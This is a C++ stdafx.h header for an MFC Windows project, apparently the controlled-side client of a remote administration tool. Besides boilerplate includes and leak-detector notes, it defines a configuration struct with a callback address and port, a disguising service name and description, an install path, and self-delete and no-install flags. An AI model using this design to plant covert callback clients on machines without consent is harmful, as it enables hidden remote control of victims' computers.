
// stdafx.h : 标准系统包含文件的包含文件，
// 或是经常使用但不常更改的
// 特定于项目的包含文件

#pragma once

#ifndef _SECURE_ATL
#define _SECURE_ATL 1
#endif

#ifndef VC_EXTRALEAN
#define VC_EXTRALEAN            // 从 Windows 头中排除极少使用的资料
#endif

#include "targetver.h"

#ifdef _DEBUG
// 检测内存泄漏，需安装VLD；否则请注释此行
// 如果安装了VLD, 请将安装路径添加到环境变量: 名称为"VLDPATH", 路径为"D:\Program Files (x86)\Visual Leak Detector"
// 请根据实际安装目录填写VLDPATH. 或者手动编辑每个项目文件的头文件目录和库目录. 有关下载VLD库的信息请参考下面链接.
// VS2017以前版本的VLD: https://kinddragon.github.io/vld
// VS2019使用的VLD（支持以往的VS版本, 推荐）: https://github.com/oneiric/vld/releases/tag/v2.7.0
// 如果要将受控端程序放到其他机器上面运行, 请使用Release模式生成的程序, 以解除对VLD的依赖; 否则你需要将VLD相关文件一同拷贝.
// 对于VLD提示内容泄露，但是追踪不了函数调用堆栈的情况，请启用使用符号服务器自动下载。这可能引起调试程序的时候变慢。
// 确保你的调试工具（如 Visual Studio 或 WinDbg）配置了符号服务器。
// 符号服务器会自动下载缺失的符号文件，包括 dbghelp.pdb，并将其缓存到本地符号路径。
// 配置符号服务器（以 Visual Studio 为例）：在 Visual Studio 中，打开 调试 > 选项 > 符号。
// 勾选 Microsoft Symbol Servers. 指定符号缓存目录，例如 "C:\Symbols"。
// 调试时，缺失的符号（如 dbghelp.pdb）会自动下载到缓存目录。
#include "vld.h"
#endif

#define _ATL_CSTRING_EXPLICIT_CONSTRUCTORS      // 某些 CString 构造函数将是显式的

// 关闭 MFC 对某些常见但经常可放心忽略的警告消息的隐藏
#define _AFX_ALL_WARNINGS

#include <afxwin.h>         // MFC 核心组件和标准组件
#include <afxext.h>         // MFC 扩展





#ifndef _AFX_NO_OLE_SUPPORT
#include <afxdtctl.h>           // MFC 对 Internet Explorer 4 公共控件的支持
#endif
#ifndef _AFX_NO_AFXCMN_SUPPORT
#include <afxcmn.h>             // MFC 对 Windows 公共控件的支持
#endif // _AFX_NO_AFXCMN_SUPPORT

#include <afxcontrolbars.h>     // 功能区和控件条的 MFC 支持




#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include "ClientSocket.h"


struct DLL_INFO {
    TCHAR LoginAddr[100];    //上线地址
    UINT LoginPort;
    TCHAR ServiceName[50];//服务名称
    TCHAR ServiceDisplayName[50]; //服务显示
    TCHAR ServiceDescription[150];  //服务描述
    TCHAR UpGroup[32];       //分组
    TCHAR strRemark[32];     //备注
    BOOL NoDelete;         //TRUE-不删除，FALSE-删除
    BOOL InshallShare;     //TRUE-安装共享服务，FALSE-新建服务
    BOOL NoInstall;        // TRUE 绿色安装, FALSE 正常
    TCHAR strPath[100];     //安装路径
};




#ifdef _UNICODE
#if defined _M_IX86
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_IA64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='ia64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_X64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#else
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#endif
#endif


